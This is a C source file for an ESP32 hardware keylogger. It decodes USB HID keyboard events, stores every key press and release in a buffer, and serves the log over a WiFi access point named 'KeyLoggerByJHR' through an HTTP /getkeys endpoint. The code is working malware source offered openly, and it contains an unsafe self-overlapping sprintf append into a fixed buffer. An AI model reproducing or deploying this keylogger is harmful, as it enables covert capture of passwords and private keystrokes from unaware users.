#include <stdio.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "esp_system.h"

#include "Decoder/hid_queue/hid_queue.h"
#include "Decoder/Keyboard/keyboard_decode.h"
#include "configKeylogger.h"

extern hid_queue_t hid_queue_test;

static char keys_buffer[KEYLOGGER_PRINT_KEY_BUFFER_SIZE];
static const char *TAG = "Key";

esp_err_t getkeys_handler(httpd_req_t *req)
{
    httpd_resp_send(req, keys_buffer, strlen(keys_buffer));
    return ESP_OK;
}
esp_err_t clskeys_handler(httpd_req_t *req)
{
    sprintf(keys_buffer, "%s", "");
    httpd_resp_send(req, "CLS OK", 6);
    return ESP_OK;
}

httpd_uri_t index_uri = {
    .uri = "/getkeys",
    .method = HTTP_GET,
    .handler = getkeys_handler,
    .user_ctx = NULL};
httpd_uri_t cls_uri = {
    .uri = "/clskeys",
    .method = HTTP_GET,
    .handler = clskeys_handler,
    .user_ctx = NULL};

void wifi_init()
{
    ESP_ERROR_CHECK(nvs_flash_init());
    ESP_ERROR_CHECK(esp_netif_init());
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    wifi_config_t wifi_config;
    sprintf((char *)wifi_config.ap.ssid, "%s", "KeyLoggerByJHR");
    wifi_config.ap.ssid_len = strlen((char *)wifi_config.ap.ssid);
    sprintf((char *)wifi_config.ap.password, "%s", "12345678");
    wifi_config.ap.channel = 6;
    wifi_config.ap.max_connection = 1;
    wifi_config.ap.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    wifi_config.ap.ssid_hidden = 0;
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    if (httpd_start(&server, &config) == ESP_OK)
    {
        httpd_register_uri_handler(server, &index_uri);
        httpd_register_uri_handler(server, &cls_uri);
    }
}

void printkey_task(void *pvParameters)
{
    hid_event_t hid_event_test;
    char key_name[10] = {};
    for (;;)
    {
        if (hid_queue_receive(hid_queue_test, &hid_event_test, portMAX_DELAY))
        {
            if (keyboard_key_code_to_ascii(hid_event_test.key_code, hid_event_test.type, key_name, 10) == KEYLOGGER_SUCCESS)
            {
                if (hid_event_test.state == KEY_STATE_PRESSED)
                {
                    ESP_LOGI(TAG, "Pressed %s", key_name);
                    sprintf(keys_buffer, "%s%s%s%s", keys_buffer, "[Press ", key_name, "]");
                }

                if (hid_event_test.state == KEY_STATE_RELEASED)
                {
                    ESP_LOGI(TAG, "Release %s", key_name);
                    sprintf(keys_buffer, "%s%s%s%s", keys_buffer, "[Release ", key_name, "]");
                }
            }
        }
    }
    vTaskDelete(NULL);
}
